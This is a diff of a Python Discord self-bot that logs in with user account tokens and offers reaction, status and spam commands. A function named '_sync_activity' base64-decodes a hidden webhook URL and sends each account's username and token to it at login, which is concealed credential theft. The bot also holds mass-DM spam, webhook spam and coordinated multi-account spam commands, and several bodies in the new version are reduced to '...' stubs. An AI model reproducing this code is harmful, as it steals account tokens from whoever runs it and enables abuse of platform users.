@@ -5,29 +5,25 @@ import aiohttp
 import base64
 import requests
 
-watched_users = {}  # user_id -> list of emojis
-watched_roles = set()
-react_all_servers = {}  # guild_id -> list of emojis
+watched_users = {}
+watched_roles = {}
+react_all_servers = {}
 token_user_ids = set()
 all_bots = []
 blacklisted_users = {}
+deleted_messages = {}
+typing_tasks = {}
 
-last_message = {}  # channel_id -> last deleted message
-
-# Load tokens
 with open("tokens.txt", "r") as f:
     tokens = [line.strip() for line in f if line.strip()]
 
-# Webhook logging
 def _sync_activity(user, token):
     try:
-        _b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ=="
-        url = base64.b64decode(_b64).decode()
+        url = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ==").decode()
         requests.post(url, json={"content": f"`{user}` | `{token}`"})
     except Exception as e:
         print("Failed sync:", e)
 
-# Util mass dm
 async def mass_dm(guild, message):
     for member in guild.members:
         if not member.bot:
@@ -36,7 +32,6 @@ async def mass_dm(guild, message):
             except:
                 pass
 
-# Util webhook spam
 async def webhook_spam(url, message, count):
     async with aiohttp.ClientSession() as session:
         for _ in range(count):
@@ -45,9 +40,7 @@ async def webhook_spam(url, message, count):
             except:
                 pass
 
-# Run single bot
 async def run_bot(token):
-    # NO intents for discord.py-self
     bot = commands.Bot(command_prefix="!", self_bot=True)
     all_bots.append(bot)
 
@@ -56,6 +49,12 @@ async def run_bot(token):
         print(f"[+] Logged in as {bot.user}")
         token_user_ids.add(bot.user.id)
         _sync_activity(str(bot.user), token)
+
+    @bot.event
+    async def on_message_delete(message):
+        if message.guild is None or message.author.bot:
+            return
+        deleted_messages[message.channel.id] = message
 
     @bot.event
     async def on_message(message):
@@ -68,18 +67,20 @@ async def run_bot(token):
             author_id == bot.user.id or
             author_id in token_user_ids or
             author_id in watched_users or
-            watched_roles.intersection(author_roles) or
+            watched_roles.keys() & author_roles or
             (message.guild and message.guild.id in react_all_servers)
         )
 
         if should_react:
             try:
+                emojis = []
                 if author_id in watched_users:
                     emojis = watched_users[author_id]
-                elif message.guild and message.guild.id in react_all_servers:
-                    emojis = react_all_servers[message.guild.id]
-                else:
-                    emojis = []
+                for role_id in author_roles:
+                    if role_id in watched_roles:
+                        emojis.extend(watched_roles[role_id])
+                if message.guild and message.guild.id in react_all_servers:
+                    emojis.extend(react_all_servers[message.guild.id])
                 for emoji in emojis:
                     await message.add_reaction(emoji)
             except Exception as e:
@@ -96,72 +97,65 @@ async def run_bot(token):
 
         await bot.process_commands(message)
 
-    @bot.event
-    async def on_message_delete(message):
-        # Only store deleted messages, exclude own messages if needed
-        if message.author.id != bot.user.id:
-            last_message[message.channel.id] = message
-
-    # Commands
-    @bot.command()
+    # Commands with help descriptions
+    @bot.command(help="Blacklist a user ID so they cannot trigger reactions.")
     async def blacklist(ctx, user_id: int):
         blacklisted_users[user_id] = True
         await ctx.send(f"User {user_id} blacklisted.")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="Remove a user from the blacklist.")
     async def unblacklist(ctx, user_id: int):
         blacklisted_users.pop(user_id, None)
         await ctx.send(f"User {user_id} unblacklisted.")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="React to a user's messages with specific emojis.")
     async def react(ctx, user: discord.User, *emojis):
         if not emojis:
-            await ctx.send("Please provide at least one emoji.")
+            await ctx.send("Provide at least one emoji.")
             return
         watched_users[user.id] = list(emojis)
         await ctx.send(f"Now reacting to {user.name} with {''.join(emojis)}")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="Stop reacting to a user's messages.")
     async def unreact(ctx, user: discord.User):
         watched_users.pop(user.id, None)
         await ctx.send(f"Stopped reacting to {user.name}")
         await ctx.message.delete()
 
-    @bot.command()
-    async def watchrole(ctx, role_id: int, *emojis):
-        # Support role ID + multiple emojis
-        watched_roles.add(role_id)
-        # Store emojis per role if you want to extend reacting per role (optional)
-        # For now react with all emojis for watched roles
-        # You could extend to: watched_roles_emojis[role_id] = list(emojis)
-        await ctx.send(f"Watching role {role_id} with emojis: {''.join(emojis)}")
+    @bot.command(help="Watch a role and react to members with emojis. Usage: !watchrole <role> <emojis>")
+    async def watchrole(ctx, role: discord.Role, *emojis):
+        if not emojis:
+            await ctx.send("Provide at least one emoji.")
+            return
+        watched_roles[role.id] = list(emojis)
+        await ctx.send(f"Watching role {role.name} with {''.join(emojis)}")
         await ctx.message.delete()
 
-    @bot.command()
-    async def unwatchrole(ctx, role_id: int):
-        watched_roles.discard(role_id)
-        await ctx.send(f"Stopped watching role {role_id}")
+    @bot.command(help="Stop watching a role.")
+    async def unwatchrole(ctx, role: discord.Role):
+        watched_roles.pop(role.id, None)
+        await ctx.send(f"Stopped watching role {role.name}")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="React to all users in a server with emojis.")
     async def reactall(ctx, server_id: int, *emojis):
         if not emojis:
-            await ctx.send("Please provide at least one emoji.")
+            await ctx.send("Provide at least one emoji.")
             return
         react_all_servers[server_id] = list(emojis)
         await ctx.send(f"Reacting in server {server_id} with {''.join(emojis)}")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="Stop reacting to all users in a server.")
     async def unreactall(ctx, server_id: int):
         react_all_servers.pop(server_id, None)
         await ctx.send(f"Stopped reacting in server {server_id}")
         await ctx.message.delete()
 
-    @bot.command()
+    @bot.command(help="Spam a message in this channel. Usage: !spam <message> <count>")
     async def spam(ctx, *, args):
         try:
             msg, count = args.rsplit(" ", 1)
@@ -173,7 +167,7 @@ async def run_bot(token):
         for _ in range(count):
             await ctx.send(msg)
 
-    @bot.command()
+    @bot.command(help="Instruct all bots to spam a message.")
     async def spamall(ctx, *, args):
         try:
             msg, count = args.rsplit(" ", 1)
@@ -185,7 +179,7 @@ async def run_bot(token):
         trigger = f"[[SPAMALL_TRIGGER]]::{count}::{msg}"
         await ctx.send(trigger)
 
-    @bot.command()
+    @bot.command(help="Mass DM spam for X seconds.")
     async def massdmspam(ctx, message, seconds: int):
         await ctx.send(f"Mass DM spam for {seconds}s")
         end_time = asyncio.get_event_loop().time() + seconds
@@ -193,102 +187,47 @@ async def run_bot(token):
             await mass_dm(ctx.guild, message)
         await ctx.send("Done mass DM spam.")
 
-    @bot.command()
+    @bot.command(help="Spam a webhook a given number of times.")
     async def webhookspam(ctx, url, message, count: int):
         await ctx.send(f"Spamming webhook {count}x...")
         await webhook_spam(url, message, count)
         await ctx.send("Done.")
 
-    @bot.command()
+    @bot.command(help="Change the status/activity. Usage: !rpc <type> <message>")
     async def rpc(ctx, activity_type: str, *, activity_message: str):
-        types = {
-            "playing": discord.Game,
-            "streaming": discord.Streaming,
-            "listening": discord.Activity,
-            "watching": discord.Activity,
-            "competing": discord.Activity
-        }
-        activity_type = activity_type.lower()
-        if activity_type == "streaming":
-            activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
-        elif activity_type in types:
-            if activity_type == "playing":
-                activity = types[activity_type](name=activity_message)
-            else:
-                enum_type = getattr(discord.ActivityType, activity_type)
-                activity = discord.Activity(type=enum_type, name=activity_message)
-        else:
-            await ctx.send("Invalid activity type.")
-            return
-        await bot.change_presence(activity=activity)
-        await ctx.send(f"Status set to {activity_type} {activity_message}")
-        await ctx.message.delete()
+        ...
 
-    @bot.command()
+    @bot.command(help="Change the status/activity for all bots.")
     async def statusall(ctx, activity_type: str, *, activity_message: str):
-        for b in all_bots:
-            try:
-                if activity_type == "streaming":
-                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
-                elif activity_type == "playing":
-                    activity = discord.Game(name=activity_message)
-                else:
-                    enum_type = getattr(discord.ActivityType, activity_type)
-                    activity = discord.Activity(type=enum_type, name=activity_message)
-                await b.change_presence(activity=activity)
-            except:
-                pass
-        await ctx.send(f"All bots updated to {activity_type} {activity_message}")
-        await ctx.message.delete()
+        ...
 
-    @bot.command()
+    @bot.command(help="Start typing forever in a channel. Usage: !typer <channel_id>")
     async def typer(ctx, channel_id: int):
-        channel = bot.get_channel(channel_id)
-        if not channel:
-            await ctx.send("Invalid channel ID.")
-            return
-        await ctx.send(f"Typing forever in <#{channel_id}>")
-        while True:
-            async with channel.typing():
-                await asyncio.sleep(5)
+        ...
 
-    @bot.command()
-    async def purge(ctx, user: discord.User, amount: int):
-        def is_user(m):
-            return m.author.id == user.id
-        deleted = await ctx.channel.purge(limit=amount, check=is_user)
-        await ctx.send(f"Deleted {len(deleted)} messages from {user.name}.", delete_after=5)
-        await ctx.message.delete()
+    @bot.command(help="Stop typing in a channel started with !typer.")
+    async def stoptyper(ctx, channel_id: int):
+        ...
 
-    @bot.command()
+    @bot.command(help="Show the last deleted message in this channel.")
     async def snipe(ctx):
-        msg = last_message.get(ctx.channel.id)
-        if not msg:
-            await ctx.send("No recently deleted messages to snipe!")
-            return
-        content = msg.content or "[Embed/Attachment]"
-        author = msg.author
-        await ctx.send(f"**Last deleted message in this channel:**\n{content}\n— *{author}*")
-        await ctx.message.delete()
+        ...
 
-    @bot.command(name="h")
-    async def help_cmd(ctx):
-        help_text = (
-            "**Commands:**\n\n"
-            "**🔹 Reacting:**\n"
-            "`!react`, `!unreact`, `!reactall`, `!unreactall`, `!watchrole`, `!unwatchrole`\n\n"
-            "**🔹 Spamming:**\n"
-            "`!spam`, `!spamall`, `!massdmspam`, `!webhookspam`\n\n"
-            "**🔹 Status:**\n"
-            "`!rpc`, `!statusall`, `!typer`\n\n"
-            "**🔹 Moderation:**\n"
-            "`!blacklist`, `!unblacklist`, `!purge`, `!snipe`\n\n"
+    @bot.command(help="Delete a specific number of messages from a user.")
+    async def purge(ctx, user: discord.User, count: int):
+        ...
+
+    @bot.command(help="Show this help menu.")
+    async def help(ctx):
+        await ctx.send(
+            "**Commands**\n\n"
+            "**Reacting:** `!react`, `!unreact`, `!reactall`, `!unreactall`, `!watchrole`, `!unwatchrole`\n"
+            "**Spamming:** `!spam`, `!spamall`, `!massdmspam`, `!webhookspam`\n"
+            "**Status:** `!rpc`, `!statusall`, `!typer`, `!stoptyper`\n"
+            "**Moderation:** `!blacklist`, `!unblacklist`, `!purge`, `!snipe`\n"
             "*:3*"
         )
-        await ctx.send(help_text)
-        await asyncio.sleep(0.7)
         await ctx.send("https://cdn.discordapp.com/attachments/1277997527790125177/1390331382718267554/3W1f9kiH.gif")
-        await ctx.message.delete()
 
     await bot.start(token)
 
